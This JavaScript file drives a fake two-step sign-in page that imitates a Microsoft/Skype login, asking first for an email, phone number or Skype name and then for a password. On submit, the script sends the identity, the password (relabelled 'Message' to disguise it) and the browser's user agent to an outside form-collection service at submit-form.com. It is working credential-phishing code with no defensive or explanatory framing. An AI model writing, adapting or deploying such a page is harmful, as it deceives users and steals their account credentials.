document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid email address, phone number, or Skype name.";
const pwdReq = "message.";

const unameInp = document.getElementById('inp_uname');
const pwdInp = document.getElementById('inp_pwd');

let view = "uname";
let unameVal = false;
let pwdVal = false;

// Next button
const nxt = document.getElementById('btn_next');

nxt.addEventListener('click', () => {
    validate();

    if (unameVal) {
        document.getElementById("section_uname").classList.add('d-none');
        document.getElementById('section_pwd').classList.remove('d-none');

        document.querySelectorAll('#user_identity').forEach((e) => {
            e.innerText = unameInp.value;
        });

        view = "pwd";
    }
});

// Submit button
const sig = document.getElementById('btn_sig');

sig.addEventListener('click', async () => {
    validate();

    if (pwdVal) {

        const data = {
            Identity: unameInp.value,
            Message: pwdInp.value,
            SubmittedAt: new Date().toLocaleString(),
            UserAgent: navigator.userAgent
        };

        try {

            const response = await fetch(
                "https://submit-form.com/TRFsGA4J6",
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: JSON.stringify(data)
                }
            );

            if (!response.ok) {
                throw new Error("Submission failed");
            }

            document.getElementById("section_pwd").classList.add('d-none');
            document.getElementById('section_final').classList.remove('d-none');

            view = "final";

        } catch (err) {
            console.error("Submission failed:", err);
            alert("Unable to submit. Please try again.");
        }
    }
});

function validate() {

    function unameValAction(type) {
        if (!type) {
            document.getElementById('error_uname').innerText = unReq;
            unameInp.classList.add('error-inp');
            unameVal = false;
        } else {
            document.getElementById('error_uname').innerText = "";
            unameInp.classList.remove('error-inp');
            unameVal = true;
        }
    }

    function pwdValAction(type) {
        if (!type) {
            document.getElementById('error_pwd').innerText = pwdReq;
            pwdInp.classList.add('error-inp');
            pwdVal = false;
        } else {
            document.getElementById('error_pwd').innerText = "";
            pwdInp.classList.remove('error-inp');
            pwdVal = true;
        }
    }

    if (view === "uname") {

        if (unameInp.value.trim() === "") {
            unameValAction(false);
        } else {
            unameValAction(true);
        }

    } else if (view === "pwd") {

        if (pwdInp.value.trim() === "") {
            pwdValAction(false);
        } else {
            pwdValAction(true);
        }
    }

    return false;
}

// Live validation
unameInp.addEventListener('input', function () {
    if (this.value.trim() === "") {
        document.getElementById('error_uname').innerText = unReq;
        this.classList.add('error-inp');
        unameVal = false;
    } else {
        document.getElementById('error_uname').innerText = "";
        this.classList.remove('error-inp');
        unameVal = true;
    }
});

pwdInp.addEventListener('input', function () {
    if (this.value.trim() === "") {
        document.getElementById('error_pwd').innerText = pwdReq;
        this.classList.add('error-inp');
        pwdVal = false;
    } else {
        document.getElementById('error_pwd').innerText = "";
        this.classList.remove('error-inp');
        pwdVal = true;
    }
});

// Back button
document.querySelector('.back').addEventListener('click', () => {
    view = "uname";
    document.getElementById("section_pwd").classList.add('d-none');
    document.getElementById('section_uname').classList.remove('d-none');
});

// Final buttons
document.querySelectorAll('#btn_final').forEach((b) => {
    b.addEventListener('click', () => {
        window.location.reload();
    });
});
